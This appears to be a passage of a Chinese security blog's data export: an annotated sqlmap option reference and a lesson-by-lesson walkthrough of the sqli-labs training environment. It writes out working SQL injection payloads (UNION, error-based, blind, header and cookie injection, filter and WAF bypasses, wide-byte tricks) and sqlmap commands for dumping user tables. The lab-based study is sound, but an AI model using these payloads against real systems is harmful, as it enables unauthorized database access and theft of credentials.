PKI)\n    指定http认证类型\n--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n    指定一个私钥文件来认证\n--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n    忽略401错误\n--proxy=PROXY       Use a proxy to connect to the target URL\n    指定代理\n--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n    指定代理的认证信息，就是账号密码\n--proxy-file=PRO..  Load proxy list from a file\n    从文件中选择代理\n--ignore-proxy      Ignore system default proxy settings\n    忽略系统默认代理\n--tor               Use Tor anonymity network\n    使用tor网络\n--tor-port=TORPORT  Set Tor proxy port other than default\n    设置tor的端口，如果不是默认端口的话\n--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n    设置tor代理的类型\n--check-tor         Check to see if Tor is used properly\n    检测tor能不能用\n--delay=DELAY       Delay in seconds between each HTTP request\n    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n    设置超时时间，默认30秒\n--retries=RETRIES   Retries when the connection timeouts (default 3)\n    设置重试的次数，默认3次\n--randomize=RPARAM  Randomly change value for given parameter(s)\n    随机地更改给定参数的值\n--safe-url=SAFEURL  URL address to visit frequently during testing\n    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n--safe-post=SAFE..  POST data to send to a safe URL\n    这里设置一个正确的post数据\n--safe-req=SAFER..  Load safe HTTP request from a file\n    从文件中读取安全，或者叫正确的http请求\n--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n    设置访问安全url的时间间隔\n--skip-urlencode    Skip URL encoding of payload data\n    不进行url编码\n--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n    设置CSRF的token\n--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n--force-ssl         Force usage of SSL/HTTPS\n    强制使用https\n--hpp               Use HTTP parameter pollution method\n    尝试了一下，只能用于ASP，得到报错信息如下：\n    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)\n    发送请求之前，先运行这段python代码，比如对某个参数进行处理\n    比如下面的，hash参数就是id的md5值\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc\n509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;\n</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>\n<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>\n<h2 id=\"二-实例\"><a href=\"#二-实例\" class=\"headerlink\" title=\"二.实例\"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs\n查看指纹信息/是否dba(root权限)/数据库\nweb server operating system: Linux Ubuntu\nweb application technology: Apache 2.4.18\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL 5.0\nbanner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;\n\ncurrent user is DBA:    True\n\navailable databases [6]:\n[*] challenges\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security\n[*] sys\n\n2.查看security下表名\n sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables\nDatabase: security\n[4 tables]\n+----------+\n| emails   |\n| referers |\n| uagents  |\n| users    |\n+----------+\n\n3.查看列名\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns\n\nDatabase: security\nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(3)      |\n| password | varchar(20) |\n| username | varchar(20) |\n+----------+-------------+\n\n4.获得所有username\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump\n\nDatabase: security\nTable: users\n[16 entries]\n+-----------+\n| username  |\n+-----------+\n| admin     |\n| admin#    |\n| admin&apos;#   |\n| admin1    |\n| admin2    |\n| admin3    |\n| admin4    |\n| admin\\\\&apos;# |\n| Angelina  |\n| batman    |\n| dhakkan   |\n| Dumb      |\n| Dummy     |\n| secure    |\n| stupid    |\n| superman  |\n+-----------+\n</code></pre><h3 id=\"三-技巧等\"><a href=\"#三-技巧等\" class=\"headerlink\" title=\"三.技巧等\"></a>三.技巧等</h3><pre><code>1.自动寻找注入点\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch\n如上，在可能的注入点后，加上*，将会自动寻找注入\n可以加上 --level n（1-5） 参数，越高越全面\n\n2.绕过WAF\n--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n3.post注入\n--data &quot;id=1&quot;\n或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n</code></pre>"},{"title":"sql-labs注入","date":"2018-08-28T03:30:20.000Z","_content":"## SQL注入\nsql注入:利用现有程序，使之执行构造的payload.\n\n### 一. 环境搭建\n- ubuntu16.04虚拟机\n- 更新阿里源 apt-get update\n- 安装mysql apt-get install mysql-server mysql-client -y\n- 安装apache apt-get install apache2 -y\n- 安装git apt-get install git -y\n- 项目 cd /var/www && sudo git clone https://github.com/Audi-1/sqli-labs.git sqli-labs  \n- 更改项目的mysql配置文件为自己数据库\n- 现在在浏览器localhost/sqli-labs已经可以访问到了\n\n##### 问题\n- navicat连不上mysql </br>\n\t注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1</br>\n\t修改select user, host from user;  update user set host = \"%\" where host = 'localhost';  flush privileges;\n- php版本导致mysql_connect()废弃 </br>\n\t安装phpstorm 配置phpcgi  apt-get install php版本-cgi</br>\n\t降低版本到php5.6错误仍然在</br>\n\t第二天重启Phpstrom 打开网页，错误消失</br>\n  猜测是降低版本有效，但第一天有缓存</br>\n<!-- more -->\n### 二.sqli-labs\n参考了大牛的教程https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\n\n- ** less1 GET-Error based - Single quotes - String </br> **\n\tphp中代码 SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n\t%20 空格 %27 单引号 %3D 等于号</br>\n\t一：?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\") 未成功  \t’$id' 注入被单引号包裹，将输入变成了字符串</br>\n\t二：?id='%20and%20username%3D%27admin 未成功 id=''这个条件未绕过\n\t想利用id=这个条件或者绕过这个条件</br>\n\t三：?id='%20or%20username%3D%27admin 成功</br>\n\t基于二，转换思路，利用or成功绕过</br>\n\t爆破数据库版本</br>\n\t?id=-1%27%20%20union%20select%201%2cversion()%2c3%23</br>\n\t？id=-1'  union select 1,version(),3#</br>\n\tunion必须列一样，所以1和3是为了保持三列\n\n- ** less 2 GET - Error based -Intiger based</br> **\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t$id未加引号过滤输入</br> ?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\")成功注入\n\n- ** less 3 GET - Error based - single quotes with twist - string**</br>\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 用括号和单引号进行了过滤</br>\n\t思路：消除括号</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27  成功\n\n\n- ** less 4  GET - Error based - Double Quotes - String ** </br>\n\tphp中代码</br>\n\t$id = '\"' . $id . '\"';</br>\n\t$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27 成功</br>\n\n    关于前四个less的一些心得：\n    \t1.找错误：\n    \t\t尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    \t\t例：?id=\"\n    \t\t\t\t 返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\") LIMIT 0,1' at line 1\n    \t\t\t可以看出输入所在位置为（“输入”）\n    \t2.注入利用\n    \t\t通过union来执行自己想要的sql\n\n- ** less 5  GET - Double Injection - Single Quotes - String ** </br>\n双查询注入（双查询：select嵌套select）</br>\n\t输入?id=‘ 失败， use near 1  由此猜测为单引号</br>\n\t?id='%20or%20username%3D%27admin 成功 </br>\n\t但是sql执行结果前端并没有进行输出，怎么利用？</br>\n\n\t查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（\\*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</br>\n\t发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）</br>\n\tcount() 计数</br>\n\trand() 随机</br>\n\tgroup by 分组</br>\n\tfloor() 向下取整，舍弃小数部分</br>\n\n\t?id=-1%27%20union%20select%201%2c(select%20count(\\*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功</br>\n\tDuplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''\n\t其中version(）是我们希望执行的函数，可以换成其它\n\n- ** less 6 GET - Double Injection - Double Quotes - String ** </br>\n\n\t?id=-1%22%20union%20select%201%2c(select%20count(\\*)%20from%\t\t20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功\n\n- ** less 7 GET - Dump into outfile - String ** </br>\n\t文件导入限制条件多，未成功\n\n- ** less 8 GET - Blind - Boolian Based - Single Quotes ** </br>\n\t?id=-1%27or%201%3d1%23 </br>\n\t利用二分与返回结果的正确与否，来猜测验证数据库内容\n\n- ** less 9 GET - Blind - Time Based - Single Quotes ** </br>\n\t?id=1%27%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23 </br>\n\t因为在这正确或者错误都是返回的\"you are in\" 所以不能区分 </br>\n  ![youarein](../../../images/security/sql/youarein.png)\n\t使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试\n\n- ** less 10 GET -Blind - Time Based - Double Quotes ** </br>\n\t?id=1\"%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23\n\n- ** less 11 POST - Error Based -Single Qoutes - String ** </br>\n\tusername:  \n      1.admin ' # admin用户</br>\n      2.adimn ' or 1=1 # 万能</br>\n      3. ' union select version(),1 # 等其它操作\n\tpasswd:\n    因为username已经用#将后面注释了，所以passwd随意输入\n\n- ** less 12 POST - Error Based - Double Quotes - String - with twist ** </br>\n将less11的单引号改为 “）\n\n- ** less 13 POST - Double Injection - Single quotes - String - with twist ** </br>\n\tusername:    ') union select (select count(\\*) from information_schema.schemata group by concat(version(),floor(rand(0)\\*2))),1 #</br>\n\t返回信息Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''</br>\n\t另外这种有正确/错误提示的，都可以二分盲注来猜测验证\n\n- ** less 14 POST  - Double Injection - Double quotes - String ** </br>\n\tless13 ') 换为 ”\n\n- ** less 15 POST - Blind - Boolean/Time Based -Single Quotes ** </br>\n\tusername: ' or 1=1 # 登录成功 </br>\n\t思路：利用or/and/if sleep()等来进行猜测</br>\n\n- ** less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist ** </br>\n\t将less15 ' 换成 \")\n\n- ** less 17 POST - Update Query - Error Based - String ** </br>\n\t这里对用户名进行了过滤</br>\n\t利用报错进行注入输出 </br>\n\tuname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&sub mit=Submit </br>\n\t输出结果XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'</br>\n  报错注入基本都是利用XPath进行报错\n\t有必要去买本书来系统的看一下mysql各种函数\n\n- ** less 18 POST - Header Injection - Uagent field - Error Based ** </br>\n\t这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后</br>\n\tphp中语句：$insert=\"INSERT INTO \\`security\\`.\\`uagents\\` (\\`uagent\\`, \\`ip_address\\`, \\`username\\`) VALUES ('$uagent', '$IP', $uname)\";</br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent</br>\n\t将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’</br>\n\t返回结果：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- ** less 19 POST - Header Injection - Referer Field - Error Based ** </br>\n\t同less 18,进行了过滤，但执行了$insert=\"INSERT INTO \\`security\\`.\\`referers\\` (\\`referer\\`, \\`ip_address\\`) VALUES ('$uagent', '$IP')\";</br>\n\t其中：$uagent = $\\_SERVER['HTTP_REFERER'];</br>\n\t将Referer 修改为: 'or extractvalue(1,concat(0x7e,database())) or'</br>\n\t返回: XPATH syntax error: '~security'\n\n- ** less 20 POST - Cookie Injection - Uagent Field - Error Based ** </br>\n\t进行了过滤</br>\n\t$cookee = $\\_COOKIE['uname'];</br>\n\t$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";</br>\n\t流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)</br>\n\t修改Cookie为： uname=-1' union select 1,(select version()),3 #</br>\n\t返回 ：\n           Your Login name:5.7.23-0ubuntu0.16.04.1\n\t\t   Your Password:3\n\t\t   Your ID:1\n\t也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\t uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# </br>\n\t返回:Issue with your mysql: XPATH syntax error: '~/usr/~'\n\n- ** less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String ** </br>\n\tsetcookie('uname', base64_encode($row1['username']), time()+3600);\n\t$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";</br>\n\t对Cookie 进行了 base64处理 </br>\n\tuname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj\n\tuname=-1') union select 1,(select version()),3 #</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\t Your Password:3</br>\n\tYour ID:1\n\n- ** less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String ** </br>\n\t对Cookie进行了base64编码，使用的双引号\n\n----------------------------------------------------------------------\n\n- ** less 23 GET - Error Based - Strip Comments ** </br>\n\tphp中处理：</br>\n\t$reg = \"/#/\";</br>\n\t$reg1 = \"/--/\";</br>\n\t$replace = \"\";</br>\n\t$id = preg_replace($reg, $replace, $id); //将$reg替换为$replace</br>\n\t$id = preg_replace($reg1, $replace, $id);</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等</br>\n\t?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:3\n\n- ** less 24 POST - Second Order Injection \\*Real treat\\* - Stored Injections ** </br>\n\t本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入</br>\n\tphp中:</br>\n      $sql = \"select count(\\*) from users where username='$username'\";\n\t\t  $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');\n\t\t  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n\t\t  $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n\t先注册一个admin'#用户，更改其密码，实际上是更改的admin的密码\n\n- **less 25 GET - Error Based - All your OR & AND Belong to us - String - Single Quotes**</br>\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)</br>\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：使用union\n\t绕过过滤：\n        （1）大小写变形 Or,OR,oR\n\t\t（2）编码，hex，urlencode\n\t\t（3）添加注释/*or*/\n\t\t（4）利用符号 and=&& or=||\n\t?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23\n\t返回：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- **less 25a GET - Blind Based - All your OR & AND Belong to us - String - Single Quotes** </br>\n\t$id= blacklist($id);</br>\n\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t//print_r(mysql_error()); </br>\n\t报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤</br>\n\t?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)</br>\n  然后依次这样，查出数据库名\n\n- **less 26 GETs - Error Based - All your Spaces and Comments Belong to us** </br>\n\tComments 注释</br>\n\tphp中:</br>\n\t   function blacklist($id)\n\t    {\n\t\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\t\treturn $id;\n\t   }\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：</br>\n  注释过滤了可以手动闭合引号，空格过滤\n\t可以使用  %a0  换行，</br>\n  /\\**/ 注释， （） 括号等绕过空格</br>\n\t此处注释不能使用，为了使用select时去掉末尾引号，空格也不行</br>\n\tid='111'union(select(1),(version()),(3)） ' LIMIT 0,1; 使用括号时，引号还在</br>\n\t?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功\n\n- **less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis** </br>\n\t过滤和less26相同</br>\n\t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";</br>\n\t?id=111%27)union%a0select%a01%2cversion()%2c3||(%271</br>\n\n\t思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&</br>\n\t?id=1%27%26%26%271=1 猜测为’ ‘</br>\n\t?id=1%27)%26%26(%271=1 猜测为（’ ‘）</br>\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n\t?id=1%22)%26%26(%221=1 猜测为(\" \")</br>\n\t?id=1)%26%26(1=1  猜测为()</br>\n\t?id=1%26%261=1 无</br>\n等诸如此类</br>\n\n- **less 27 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n  \t$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n  \t$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n  \t$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n  \t$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n  \t$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\n  \treturn $id;\n  \t}\n\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\n\t思路一：大小写绕过</br>\n\t?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27</br>\n\t思路二：报错或延时？\n\n- **less 27a GET - Blind Based - All your UNION & SELECT Belong to us -Double Quotes**</br>\n\t1.?id=1%22%26%26%221=1 成功，猜测为“ \"过滤</br>\n\t2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入</br>\n\n- **less 28 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes with Parentesis**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t   \t\t \tStrip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out UNION & SELECT.\n  \treturn $id;\n  \t}\n\t   $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27\n\n  - **less 28a GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes - Parentesis**</br>\n    \tfunction blacklist($id)\n    \t{\n    \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\n    \treturn $id;\n    \t}\n    \t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同\n\n- **less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application**</br>\n服务器（两层架构）</br>\n\t当?id=1&id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容</br>\n\t此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 </br>\n\t?id=1&id=-2%27union%20select%201,user(),version()%27</br>\n\t返回:</br>\n  Your Login name:root@localhost</br>\n\tYour Password:5.7.23-0ubuntu0.16.04.1\n\n- **less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web**</br>\n\t?id=1&id=-2%22union%20select%201,user(),version()%22\n\n- **less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web** </br>\n\t?id=1&id=-2\")union%20select%201,user(),version()%23\n\n- **less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars**</br>\n宽字节注入</br>\n\t原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。</br>\n  一般有两种思路： </br>\n\t1、%df 吃掉 \\ 具体的原因是 urlencode(‘\\) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。</br>\n\t2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %\\**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</br>\n\n\taddslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：'   \"  \\</br>\n\taddslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行\n  \tfunction check_addslashes($string)\n  \t{\n  \t\t$string= addslashes($string);    \n  \t\treturn $string;\n  \t}\n\t例?id=-1%27%20union%20select%201,version(),user()%20%27</br>\n\tThe filtered request is :-1\\' union select 1,version(),user() \\'</br>\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23</br>\n\t返回:</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:root@localhost\n\n- **less 33 GET -  Bypass AddSlashers()**</br>\n\t?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样\n\n- **less 34 POST - Bypass AddSlashers()**</br>\n\tpost型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为' 。我们就 可以利用这个方式进行尝试。</br>\n\n\t運' or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c </br>\n\tSELECT username, password FROM users WHERE username='運\\' or 1=1# ' and password='' LIMIT 0,1\n\n- **less 35 GET - Bypass Add Slashes(we dont need them) Integer Based**</br>\n\tphp中：$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t可以看出，不需要构造特殊符号</br>\n\t?id=-1%20union%20select%201,version(),user()%23</br>\n\n- **less 36 GET - Bypass mysql_real _escape _string**</br>\n\tmysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符</br>\n\tstring 必需，要转义的字符串</br>\n\tconnection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接</br>\n  \t\\x00  ascii码 null\n  \t\\n\t换行\n  \t\\r\t回车\n  \t\\\n  \t'\n  \t\"\n  \t\\x1a （即十进制26）&\n\t这些字符会被转义</br>\n\n  \tfunction check_quotes($string)\n  \t{\n  \t\t$string= mysql_real_escape_string($string);    \n  \t\treturn $string;\n  \t}\n  \t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 